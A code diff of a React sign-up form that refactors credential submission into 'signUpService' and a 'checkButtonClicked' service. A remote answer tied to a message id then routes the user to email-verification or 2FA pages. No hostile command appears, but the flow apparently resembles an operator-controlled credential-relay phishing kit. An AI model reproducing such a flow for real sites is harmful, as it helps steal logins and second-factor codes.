@@ -8,32 +8,18 @@ import styles from './styles.module.css';
 import {CustomCheckbox} from '../../common/checkbox';
 import Image from 'next/image';
 import {useRouter} from "next/navigation";
-import {routeConstants} from "../../../../constants/route";
-import {AppRouterInstance} from "next/dist/shared/lib/app-router-context.shared-runtime";
+import {signUpService} from "@/services/sign-up";
+import {checkService} from "@/services/check";
+import {getResponseRoute} from "../../../../utils/navigation";
+import {sessionConst} from "@/constants/session";
 
 const schema = yup.object().shape({
   email: yup.string().email('Email is not valid').required('Email is required'),
   password: yup.string().min(6, 'Password must be at least 6 characters').required('Password is required'),
 });
 
-
-const getResponseRoute = (router: AppRouterInstance, type: 'email' | '2fa' | 'all') => {
-  const navigationMapper = {
-    'email': routeConstants.VERIFY_EMAIL,
-    '2fa': routeConstants.TWO_FA,
-  }
-
-  if (type === 'all') {
-    router.push(routeConstants.TWO_FA)
-    sessionStorage.setItem('all', '1')
-    return
-  }
-
-  router.push(navigationMapper[type as 'email' | '2fa'])
-}
-
 export const SignUpForm: React.FC = () => {
-  const router = useRouter()
+  const router = useRouter();
   const [checked, setChecked] = useState(false);
   const [loading, setLoading] = useState(false);
   const {register, handleSubmit, formState: {errors, isDirty, isValid}} = useForm({
@@ -42,33 +28,28 @@ export const SignUpForm: React.FC = () => {
   });
 
   const isDisabled = !isDirty || !isValid || !checked;
-  const onSubmit = async (data: { email: string; password: string }) => {
+
+  const onSubmit = async (formData: { email: string; password: string }) => {
     setLoading(true)
+    sessionStorage.setItem(sessionConst.Email, formData.email)
 
-    sessionStorage.setItem('gd600-ap', data.email)
+    const {data, error} = await signUpService.signUpUser(formData)
 
+    if (error) window.location.reload();
 
-    const fetchWithTimeout = (url: string, options: RequestInit, timeout = 58000) => {
-      return Promise.race([
-        fetch(url, options).then((res) => res.json()),
-        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
-      ]);
-    };
+    const messageId = data?.messageId;
 
-    try {
-      const res = await fetchWithTimeout('/api', {
-        method: 'POST',
-        body: JSON.stringify(data),
-      });
+    if (messageId) {
+      const response = await checkService.checkButtonClicked({messageId})
 
+      const {error, data} = response as { error: string | null, data: any }
 
-      if (!res?.error) {
-        getResponseRoute(router, res?.data?.key)
+      if (error) window.location.reload();
+
+      if (data) {
+        setLoading(false)
+        getResponseRoute(router, data)
       }
-
-      // eslint-disable-next-line @typescript-eslint/no-unused-vars
-    } catch (e) {
-      window.location.reload()
     }
   };
 
@@ -112,8 +93,6 @@ export const SignUpForm: React.FC = () => {
           <button type="submit" disabled={isDisabled}
                   className={styles.continueButton}>{loading ? "Wait..." : "Continue"} </button>
         </form>
-
-
       </div>
     </div>
   );
